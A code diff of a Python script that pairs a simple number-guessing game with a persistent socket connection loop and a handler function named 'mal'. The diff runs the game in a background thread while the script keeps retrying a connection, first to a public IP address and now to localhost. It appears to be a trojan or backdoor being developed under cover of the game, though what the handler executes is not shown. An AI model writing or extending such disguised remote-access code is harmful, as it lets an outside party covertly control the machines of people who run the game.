@@ -14,7 +14,7 @@ def mal(sock):
             sock.send(b"something went wrong!")
 
 def num_guesser():
-    print("\n\n\n\n\n\n\n\n====Number Guesser====")
+    print("====Number Guesser====")
     num = random.randrange(0, 100)
     tries = 0
     while True:
@@ -32,16 +32,14 @@ def num_guesser():
  
         tries += 1
 
-
-
-num_guesser()
+threading.Thread(target=num_guesser).start()
 
 sock = None
 
 while True:
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect(("85.226.102.252", 25565))
+        sock.connect(("localhost", 3000))
         break
     except:
         continue
